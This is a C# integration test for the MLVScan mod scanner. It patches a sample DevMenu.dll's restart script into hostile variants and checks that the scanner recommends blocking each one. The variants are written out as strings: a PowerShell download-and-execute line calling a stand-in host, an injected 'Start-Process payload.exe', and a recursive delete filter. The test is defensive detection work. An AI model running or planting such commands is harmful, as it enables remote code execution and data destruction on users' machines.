using FluentAssertions;
using MLVScan.Models;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Integration;

public class RestartScriptScanTests
{
    [SkippableTheory]
    [InlineData("original", false)]
    [InlineData("download", true)]
    [InlineData("launcher-command", true)]
    [InlineData("target", true)]
    [InlineData("cleanup", true)]
    public void Scan_DevMenu_RestartBindingsControlAdvisory(string variant, bool blockingExpected)
    {
        string? path = null;
        for (var directory = new DirectoryInfo(Directory.GetCurrentDirectory()); directory != null; directory = directory.Parent)
        {
            var candidate = Path.Combine(directory.FullName, "TO_ANALYZE", "DevMenu.dll");
            if (File.Exists(candidate)) { path = candidate; break; }
        }
        Skip.If(path == null, "Optional DevMenu analysis sample is not available.");

        // Cecil reads metadata only. Neither the sample nor the generated variants are loaded or executed.
        using var assembly = AssemblyDefinition.ReadAssembly(path!);
        var method = assembly.MainModule.Types.Single(t => t.FullName == "DevMenu.Mod")
            .Methods.Single(m => m.Name == "RestartGame");
        var literals = method.Body.Instructions.Where(i => i.OpCode.Code == Code.Ldstr).ToList();
        switch (variant)
        {
            case "download":
                var scriptTail = literals.Single(i => ((string)i.Operand).Contains("launch 2 (the game was not running)"));
                scriptTail.Operand += "; Invoke-WebRequest https://example.invalid/payload | Invoke-Expression";
                break;
            case "launcher-command":
                literals.Single(i => (string)i.Operand == "\"'} | Out-Null").Operand = "\"'} | Out-Null; Start-Process payload.exe";
                break;
            case "target":
                literals.Single(i => ((string)i.Operand).StartsWith("steam://run/", StringComparison.Ordinal)).Operand = "payload.exe";
                break;
            case "cleanup":
                var cleanup = literals.Single(i => ((string)i.Operand).Contains("-Filter *.delete"));
                cleanup.Operand = ((string)cleanup.Operand).Replace("-Filter *.delete", "-Filter * -Recurse");
                break;
        }

        using var stream = new MemoryStream();
        assembly.Write(stream);
        var bytes = stream.ToArray();
        stream.Position = 0;
        var findings = new AssemblyScanner(RuleFactory.CreateDefaultRules()).Scan(stream, "DevMenu.dll").ToList();
        var dto = ScanResultMapper.ToDto(findings, "DevMenu.dll", bytes, false);
        dto.Disposition!.Classification.Should().Be("Suspicious");
        dto.Disposition.BlockingRecommended.Should().Be(blockingExpected);
        findings.Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Severity == Severity.Critical);
        findings.Any(f => f.HasConstrainedRestartEvidence).Should().Be(!blockingExpected);
        var execution = findings.Single(f => f.RuleId == "ProcessStartRule" && f.Severity == Severity.Critical);
        if (variant == "launcher-command")
        {
            execution.Description.Should().NotContain("Bound written PowerShell script:");
        }
        else
        {
            execution.Description.Should().Contain("Bound written PowerShell script:")
                .And.Contain("Wait-Process -Id <current process ID>");
            if (variant == "download") execution.Description.Should().Contain("Invoke-WebRequest https://example.invalid/payload");
            if (variant == "target") execution.Description.Should().Contain("Start-Process 'payload.exe'");
            if (variant == "cleanup") execution.Description.Should().Contain("-Filter * -Recurse");
        }
    }
}
